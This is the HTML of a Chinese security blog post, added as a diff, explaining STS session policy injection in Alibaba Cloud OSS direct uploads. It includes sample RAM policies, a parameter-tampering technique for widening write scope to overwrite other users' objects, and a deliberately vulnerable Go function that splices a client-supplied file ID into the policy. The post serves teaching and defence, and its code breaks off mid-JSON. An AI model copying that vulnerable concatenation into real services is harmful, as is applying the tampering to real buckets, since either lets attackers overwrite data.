@@ -1,0 +1,283 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="云安全 STS Policy注入 参考：【云安全】万字剖析STS Policy 注入在对象存储直传与攻击中的利用链：从 STS 越权到 Unicode 二次绕过-先知社区\nSTS是什么 关于STS，很多人挖洞看到的通常是AK、SK、还有一个Token，比如长这个样子。\n"><title>云安全 STS Policy注入</title><link rel=canonical href=https://0d000721999.github.io/p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/><link rel=stylesheet href=/scss/style.min.e8f9fb65172830b7456cc8f040d4bbb0a7691d6eaa1e581f17d264a13d1d48d4.css><meta property='og:title' content="云安全 STS Policy注入"><meta property='og:description' content="云安全 STS Policy注入 参考：【云安全】万字剖析STS Policy 注入在对象存储直传与攻击中的利用链：从 STS 越权到 Unicode 二次绕过-先知社区\nSTS是什么 关于STS，很多人挖洞看到的通常是AK、SK、还有一个Token，比如长这个样子。\n"><meta property='og:url' content='https://0d000721999.github.io/p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/'><meta property='og:site_name' content='美咕噜的小站'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='STS Policy注入'><meta property='article:published_time' content='2026-09-08T00:00:00+00:00'><meta property='article:modified_time' content='2026-09-08T00:00:00+00:00'><meta property='og:image' content='https://0d000721999.github.io/p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/1_hu_7e640a488049a368.webp'><meta name=twitter:title content="云安全 STS Policy注入"><meta name=twitter:description content="云安全 STS Policy注入 参考：【云安全】万字剖析STS Policy 注入在对象存储直传与攻击中的利用链：从 STS 越权到 Unicode 二次绕过-先知社区\nSTS是什么 关于STS，很多人挖洞看到的通常是AK、SK、还有一个Token，比如长这个样子。\n"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://0d000721999.github.io/p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/1_hu_7e640a488049a368.webp'><link rel="shortcut icon" href=/favicon.ico><link rel=preload href=/font/SeriousShannsNerdFontMono-Regular.bb31bd214d39201a3b7c975bff8d7d28aea776ea8f432b538b7e79013af419fc.woff2 as=font type=font/woff2 crossorigin><style>@font-face{font-family:blogmono;src:url(/font/SeriousShannsNerdFontMono-Regular.bb31bd214d39201a3b7c975bff8d7d28aea776ea8f432b538b7e79013af419fc.woff2)format("woff2");font-display:swap;font-style:normal;font-weight:400}body{background-color:#f3eeee;background-image:linear-gradient(rgba(255,255,255,.16),rgba(255,255,255,.16)),url(/background/1_hu_5012b4e0f83d2384.c8c1acd7eaca2e2d02130c7c020ff283d01dbcc672cf5f750be3a8bdb2bb246e.webp);background-repeat:no-repeat;background-position:50% 0;background-size:cover;background-attachment:fixed}@media(max-width:767px){body{background-image:linear-gradient(rgba(255,255,255,.24),rgba(255,255,255,.24)),url(/background/1_hu_de1ff494d38eb06b.adf00830bddcc1b219db2ff10dd9314f66e7f5e8dcbfce28404699e20b44b9fb.webp);background-attachment:scroll}}@media(prefers-reduced-motion:reduce){body{background-attachment:scroll}}</style></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.setItem(e,"light")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_cc7d4f5d18fa2884.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>😋</span></figure><div class=site-meta><h1 class=site-name><a href=/>美咕噜的小站</a></h1><h2 class=site-description>Ciallo～(∠・ω&lt; )⌒★</h2></div></header><ol class=menu-social><li><a href=https://buuoj.cn/users/175721 target=_blank title=BUUOJ rel=me><svg class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M7 20V4h6a4 4 0 010 8 4 4 0 010 8H7"/><line x1="7" y1="12" x2="13" y2="12"/></svg></a></li><li><a href=https://github.com/0d000721999 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>主页</span></a></li><li><a href=/%E5%85%B3%E4%BA%8E/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>关于</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>归档</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>搜索</span></a></li><li><a href=/friends/><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
+<span>友链</span></a></li><li><a href=/%E9%93%BE%E6%8E%A5/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>链接</span></a></li><li class=menu-bottom-section><ol class=menu></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#sts是什么>STS是什么</a></li><li><a href=#输入流入侵控制流>输入流入侵控制流</a><ol><li><a href=#为什么不能通过目录穿越进行任意文件读取>为什么不能通过目录穿越进行任意文件读取</a></li></ol></li><li><a href=#输入流入侵控制流再到云policy注入>输入流入侵控制流再到云Policy注入</a><ol><li><a href=#其他云的policy注入>其他云的policy注入</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/><img src=/p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/1_hu_bdce3a1c432527a.webp srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/1_hu_bdce3a1c432527a.webp 800w, /p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/1_hu_7e640a488049a368.webp 1600w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" width=800 height=1624 loading=eager decoding=async fetchpriority=high alt="文章封面：云安全 STS Policy注入"></a></div><div class=article-details><header class=article-category><a href=/categories/%E4%BA%91%E5%AE%89%E5%85%A8/ style=background-color:#264653;color:#fff>云安全</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/>云安全 STS Policy注入</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>2026-09-08</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 6 分钟</time></div></footer></div></header><section class=article-content><h1 id=云安全-sts-policy注入>云安全 STS Policy注入</h1><p>参考：<a class=link href=https://xz.aliyun.com/news/92599 target=_blank rel=noopener>【云安全】万字剖析STS Policy 注入在对象存储直传与攻击中的利用链：从 STS 越权到 Unicode 二次绕过-先知社区</a></p><h2 id=sts是什么>STS是什么</h2><p>关于STS，很多人挖洞看到的通常是AK、SK、还有一个Token，比如长这个样子。</p><p><img src=/p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/image-20260908153320782_hu_22cc938d1a4a2c2a.webp width=921 height=460 srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/image-20260908153320782_hu_729679500418c272.webp 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/image-20260908153320782_hu_22cc938d1a4a2c2a.webp 921w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/image-20260908153320782_hu_22cc938d1a4a2c2a.webp data-full-width=921 data-full-height=460 loading=lazy decoding=async alt=image-20260908153320782 class=gallery-image data-flex-grow=200 data-flex-basis=480px></p><p>然后测试的时候一般会尝试能不能../../../或者直接调用一些现有的安全工具对这个下发的sts安全凭证进行测试</p><p>看一下腾讯云对STS的描述</p><p><img src=/p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/image-20260908153716681_hu_e6d829fa62958f5b.webp width=1024 height=418 srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/image-20260908153716681_hu_f54cff75fc75deb7.webp 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/image-20260908153716681_hu_e6d829fa62958f5b.webp 1024w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/image-20260908153716681_hu_b33897850d86892f.webp data-full-width=1600 data-full-height=653 loading=lazy decoding=async alt=image-20260908153716681 class=gallery-image data-flex-grow=244 data-flex-basis=587px></p><p>简单来说，就是由可信后端保管长期凭证，或者通过 RAM 角色获取调用 STS 的权限（<strong>这里用的比较多的就是PutObject和GetObject</strong>），再针对当前这一次上传签发一组临时凭证。这组凭证的有效期可以很短，权限也可以通过会话 Policy 进一步收窄，比如只允许向指定存储桶、指定目录，甚至指定对象上传文件。这样一来，长期 AK/SK 就不需要进入前端；即使临时凭证意外泄露，攻击者能够利用的时间和权限范围也都比较有限。</p><h2 id=输入流入侵控制流>输入流入侵控制流</h2><p>这里我们需要先去创建一个RAM 用户，拿到AccessKey ID 和 AccessKey Secret</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl> <span class=nt>&#34;Version&#34;</span><span class=p>:</span> <span class=s2>&#34;1&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=nt>&#34;Statement&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>   <span class=c1>//Statement 是具体的授权规则列表
+</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=p>{</span>
+</span></span><span class=line><span class=cl>     <span class=nt>&#34;Effect&#34;</span><span class=p>:</span> <span class=s2>&#34;Allow&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>   <span class=c1>//Effect 表示这条规则的效果。常见取值有：Allow：允许。Deny：拒绝。这里默认是Allow放过去
+</span></span></span><span class=line><span class=cl><span class=c1></span>     <span class=nt>&#34;Action&#34;</span><span class=p>:</span> <span class=s2>&#34;oss:PutObject&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>   <span class=c1>//动作，这里可以从文档里面获取，PutObject就是可以上传对象，ListObject就是列出对象
+</span></span></span><span class=line><span class=cl><span class=c1></span>     <span class=nt>&#34;Resource&#34;</span><span class=p>:</span> <span class=s2>&#34;acs:oss:*:*:examplebucket/exampledir/*&#34;</span>
+</span></span><span class=line><span class=cl>   <span class=c1>//持有这份权限的身份，可以向 examplebucket 存储桶中所有以 exampledir/ 开头的对象写入文件，但没有读取、删除或访问其他目录的权限。
+</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=p>}</span>
+</span></span><span class=line><span class=cl> <span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>在权限编辑页面，我们可以选择对角色权限进行编辑</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>oss</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>PutObject</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>│</span><span class=w>       </span><span class=err>│</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>│</span><span class=w>       </span><span class=err>└──</span><span class=w> </span><span class=err>具体操作：写入对象</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>└──────────</span><span class=w> </span><span class=err>云服务：对象存储</span><span class=w> </span><span class=n>OSS</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>oss</span><span class=p>:</span><span class=n>PutObject</span><span class=w> </span><span class=err>主要用于向</span><span class=w> </span><span class=n>OSS</span><span class=w> </span><span class=err>上传或写入对象。比如：</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>exampledir</span><span class=o>/</span><span class=n>avatar</span><span class=p>.</span><span class=n>png</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>exampledir</span><span class=o>/</span><span class=n>report</span><span class=p>.</span><span class=n>pdf</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>exampledir</span><span class=o>/</span><span class=mi>2026</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=n>demo</span><span class=p>.</span><span class=n>txt</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>Resource</span><span class=w> </span><span class=err>表示这条权限可以作用在哪些资源上。把它拆开来看：</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>acs</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>oss</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>examplebucket</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=n>exampledir</span><span class=cm>/*
+</span></span></span><span class=line><span class=cl><span class=cm>  │     │     │   │          │              │
+</span></span></span><span class=line><span class=cl><span class=cm>  │     │     │   │          │              └─ 对象名称前缀
+</span></span></span><span class=line><span class=cl><span class=cm>  │     │     │   │          └──────────────── Bucket 名称
+</span></span></span><span class=line><span class=cl><span class=cm>  │     │     │   └─────────────────────────── 阿里云账号范围
+</span></span></span><span class=line><span class=cl><span class=cm>  │     │     └─────────────────────────────── 地域region
+</span></span></span><span class=line><span class=cl><span class=cm>  │     └───────────────────────────────────── 云服务
+</span></span></span><span class=line><span class=cl><span class=cm>  └─────────────────────────────────────────── 阿里云资源名称前缀
+</span></span></span></code></pre></td></tr></table></div></div><h3 id=为什么不能通过目录穿越进行任意文件读取>为什么不能通过目录穿越进行任意文件读取</h3><p>在传统文件系统中： exampledir/../../target.txt 会被路径解析函数归一化为： ../target.txt 因此可能逃出原来的目录。 但 OSS 使用的是 Object Key，不是真实文件路径。阿里云官网明确说明，OSS 本身没有传统文件系统的文件夹概念，只是通过 Key 中的 / 模拟目录效果。</p><p>所以在 OSS 语义中： exampledir/../../target.txt 通常表示的就是一个完整 Key： Key = &ldquo;exampledir/../../target.txt&rdquo; .. 并不天然具有“返回上级目录”的含义。它不会自动变成： target.txt</p><p>如果会话 Policy 是： &ldquo;Resource&rdquo;: &ldquo;acs:oss:<em>:</em>:examplebucket/exampledir/*&rdquo; 那么 exampledir/../../target.txt 即使被接受，仍然只是一个以 exampledir/ 开头的 Key。它不会因此覆盖 Bucket 根部真正名为 target.txt 的对象。</p><p><img src=/p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/image-20260920111842779_hu_333ce605156b5ca6.webp width=772 height=381 srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/image-20260920111842779_hu_cc0b1a1ee1f22165.webp 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/image-20260920111842779_hu_333ce605156b5ca6.webp 772w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/%E4%BA%91%E5%AE%89%E5%85%A8-sts-policy%E6%B3%A8%E5%85%A5/image-20260920111842779_hu_333ce605156b5ca6.webp data-full-width=772 data-full-height=381 loading=lazy decoding=async alt=image-20260920111842779 class=gallery-image data-flex-grow=202 data-flex-basis=486px></p><p>这里可以看到，前端请求中存在一个 fileKey 参数，它的值类似于：/2025-05-21/xxxx.xlsx，如果服务端没有自行生成 Object Key，而是直接使用前端提交的 fileKey 构造 STS 会话 Policy，那么我们就可以尝试把其中的2025-05-21 修改成其他日期，例如：2025-05-20/xxx.xlsx ，如果后端没有校验这个日期前缀是否属于当前用户，就可能据此生成下面这段权限：acs:oss:<em>:</em>:这里是存储桶的地域，不用管，是场景方自己配置的/2025-05-20/* ， <strong>假设 RAM 角色本身拥有整个 Bucket 的写入权限，那么角色权限与这份会话 Policy 取交集后，新签发的 STS Token 就会获得对 /2025-05-20/* 的 PutObject 权限。</strong></p><p>攻击者随后便可以向其他日期前缀写入文件；如果同时可以控制完整 Object Key，并指定一个已经存在的对象名称，也就是很多人喜欢挖的头像覆盖或者文件覆盖等等，在未开启版本控制的情况下，还可能覆盖原有对象。这里的关键并不是 ../../ 路径穿越，而是前端提交的 fileKey 影响了后端生成的 Resource。换句话说，<strong>攻击者通过修改一个普通业务参数，改变了 STS Token 最终获得的资源范围</strong>。如果 RAM 角色的权限上限已经在服务端限制为： acs:oss:<em>:</em>:examplebucket/2025-05-21/<em>， 那么即使前端把日期改成 2025-05-20，后端也生成了对应的会话 Policy，这部分权限仍然不在角色的授权范围内。由于最终权限取角色策略与会话 Policy 的交集，STS Token 对 2025-05-20/</em> 的写入权限不会生效，实际上传时会被 OSS 拒绝。</p><p>至于防御，厂商有禁止同名文件覆盖的参数,OSS 的 PutObject 支持：x-oss-forbid-overwrite: true</p><h2 id=输入流入侵控制流再到云policy注入>输入流入侵控制流再到云Policy注入</h2><p>首先是后端写法，我们在真实业务场景中一般不会对Policy生成的STS做List Object权限，一般是给Put和Get权限</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kd>func</span> <span class=nf>aliyunVulnerablePolicy</span><span class=p>(</span><span class=nx>bucket</span><span class=p>,</span> <span class=nx>fid</span> <span class=kt>string</span><span class=p>)</span> <span class=kt>string</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>fmt</span><span class=p>.</span><span class=nf>Sprintf</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=s>`{&#34;Version&#34;:&#34;1&#34;,&#34;Statement&#34;:[{&#34;Effect&#34;:&#34;Allow&#34;,&#34;Action&#34;:[&#34;oss:GetObject&#34;,&#34;oss:PutObject&#34;],&#34;Resource&#34;:[&#34;acs:oss:*:*:%s/%s&#34;]}]}`</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>bucket</span><span class=p>,</span> <span class=nx>fid</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里我们的前端可以控制上传的文件名来拿到STS，同时通过STS和文件内容，来对文件进行上传,通过获取到的STS也是不能直接对OSS Browser拥有登录权限的</p><p>这里作者写的靶场代码在获取/api/v1/sts路由过来的fulPathFid参数后，发送给了AssumeRole(fullPathFid)，然后继续传递到了下一层的provider.go</p><p>这里的第一个参数为bucket的值，是不可控的。第二个是fullpath的值，也就是文件名，此时文件名可控，所以最后的数据流转过程就是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=nx>main</span><span class=p>.</span><span class=k>go</span><span class=p>:</span><span class=mi>77</span>
+</span></span><span class=line><span class=cl>  <span class=nx>读取</span> <span class=nx>文件名</span>
+</span></span><span class=line><span class=cl>      <span class=err>↓</span>
+</span></span><span class=line><span class=cl>  <span class=nx>main</span><span class=p>.</span><span class=k>go</span><span class=p>:</span><span class=mi>87</span>
+</span></span><span class=line><span class=cl>  <span class=nx>p</span><span class=p>.</span><span class=nf>AssumeRole</span><span class=p>(</span><span class=nx>fid</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=err>↓</span>
+</span></span><span class=line><span class=cl>  <span class=nx>aliyun</span><span class=p>.</span><span class=k>go</span><span class=p>:</span><span class=mi>24</span>
+</span></span><span class=line><span class=cl>  <span class=nx>生成</span> <span class=nx>Policy</span>
+</span></span><span class=line><span class=cl>      <span class=err>↓</span>
+</span></span><span class=line><span class=cl>  <span class=nx>provider</span><span class=p>.</span><span class=k>go</span><span class=p>:</span><span class=mi>38</span><span class=o>-</span><span class=mi>41</span>
+</span></span><span class=line><span class=cl>  <span class=nx>fmt</span><span class=p>.</span><span class=nx>Sprintf</span> <span class=nx>拼接</span> <span class=nx>fullPathFid</span>
+</span></span><span class=line><span class=cl>      <span class=err>↓</span>
+</span></span><span class=line><span class=cl>  <span class=nx>aliyun</span><span class=p>.</span><span class=k>go</span><span class=p>:</span><span class=mi>38</span>
+</span></span><span class=line><span class=cl>  <span class=nx>Policy</span> <span class=nx>放入</span> <span class=nx>AssumeRoleRequest</span>
+</span></span><span class=line><span class=cl>      <span class=err>↓</span>
+</span></span><span class=line><span class=cl>  <span class=nx>aliyun</span><span class=p>.</span><span class=k>go</span><span class=p>:</span><span class=mi>40</span>
+</span></span><span class=line><span class=cl>  <span class=nx>调用</span> <span class=nx>STS</span> <span class=nx>AssumeRole</span>
+</span></span><span class=line><span class=cl>      <span class=err>↓</span>
+</span></span><span class=line><span class=cl>  <span class=nx>aliyun</span><span class=p>.</span><span class=k>go</span><span class=p>:</span><span class=mi>45</span><span class=o>-</span><span class=mi>55</span>
+</span></span><span class=line><span class=cl>  <span class=nx>返回临时</span> <span class=nx>STS</span> <span class=nx>凭证</span>
+</span></span></code></pre></td></tr></table></div></div><p>然后我们可以用代码拼接注入的思想看我们前面配置的策略</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;Version&#34;</span><span class=p>:</span> <span class=s2>&#34;1&#34;</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;Statement&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;Effect&#34;</span><span class=p>:</span> <span class=s2>&#34;Allow&#34;</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;Action&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;oss:GetObject&#34;</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;oss:PutObject&#34;</span>
